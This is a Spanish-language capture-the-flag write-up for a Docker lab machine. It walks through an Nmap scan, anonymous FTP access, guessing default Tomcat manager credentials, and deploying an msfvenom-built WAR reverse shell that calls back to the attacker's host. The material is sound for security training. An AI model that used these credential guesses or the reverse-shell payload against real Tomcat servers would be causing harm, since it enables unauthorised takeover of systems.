# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/89ee97d0-43fe-40e3-91d9-6c4f7e67b31c)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **21/tcp(FTP):** vsftpd 3.0.5
2.  **8080/tcp(HTTP):** Apache Tomcat 9.0.88
### Puerto 8080
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a la página por defecto de Apache tomcat.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ac269a6b-ad8f-4163-b0a9-662de4a28967)

### Fase 2- Exploración

### FTP
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2ba5140a-ced8-464a-a05c-57ef191efdff)

Nos conectamos por FTP con el usuario anonymous a la maquina y encontramos un tomcat.txt que contiene lo siguiente:
`Hello tomcat, can you configure the tomcat server? I lost the password...`
Es posible que **tomcat** sea el usuario que necesitaremos en el servicio que corre por el puerto **8080**.

### Manager Webapp
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/919f5358-2c84-493f-9da8-5bbc9d37540e)

Al hacer click en "**manager webapp**" nos aparece un panel de login en el navegador para poder acceder.

# Fase 3- Explotación
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/bbcee539-da93-4d49-b489-8d35fc93d91f)

Probamos contraseñas por defecto para **tomcat**:
```python
admin:admin
tomcat:tomcat
admin:
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```
Las credenciales **tomcat:s3cr3t** nos dan resultado

### Manager PWNED
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/cdafd31e-2ed2-4e81-aba2-69c339022128)

Logramos acceder al panel de administración de **tomcat**. Ahora tenemos que conseguir acceso a la máquina, y lo podemos hacer mediante un paquete "**.war**" malicioso. Que nos devolverá una **Reverse shell**.

Lo crearemos fácilmente con **msfvenom**:
```python
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o RevShell.war
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3646bfc7-1251-4220-b3a5-3eb4137f1134)

En el panel de administración, vamos al apartado **WAR file to deploy**, seleccionamos nuestra **RevShell.war** y la subimos..

### Reverse shell
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b7d2b320-3cfb-48a4-9b4f-b258b6561a6c)

Ejecutamos el archivo **.war** 

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a0090864-c0df-4947-a1ca-0e5b5621d760)

Y nos llego la reverse shell y tenemos privilegios máximos!
